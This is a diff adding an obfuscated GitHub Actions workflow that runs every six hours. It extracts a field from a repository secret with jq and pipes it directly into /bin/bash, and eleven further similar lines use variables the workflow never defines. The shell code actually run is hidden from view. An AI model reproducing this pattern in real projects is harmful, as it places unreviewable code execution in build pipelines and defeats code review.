@@ -1,0 +1,29 @@
+name: wanlinggaonong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanlinggaonong
+        env:
+          fpo4: ${{ secrets.fpo4 }}
+        run: |
+          echo $fpo4 | jq -r .tjrgw3 | /bin/bash
+          echo $hqdu83 | jq -r .wtfb35936 | /bin/bash
+          echo $u086 | jq -r .fy798 | /bin/bash
+          echo $wroo23 | jq -r .swrgt0 | /bin/bash
+          echo $c494 | jq -r .km24 | /bin/bash
+          echo $rey44 | jq -r .h9148 | /bin/bash
+          echo $bcaqc5 | jq -r .zjmmk724 | /bin/bash
+          echo $korfy3 | jq -r .sxcf93 | /bin/bash
+          echo $syfog4567 | jq -r .fo83 | /bin/bash
+          echo $pjul43 | jq -r .k952 | /bin/bash
+          echo $d44083 | jq -r .e7 | /bin/bash
+          echo $m2 | jq -r .eqb12479 | /bin/bash
+
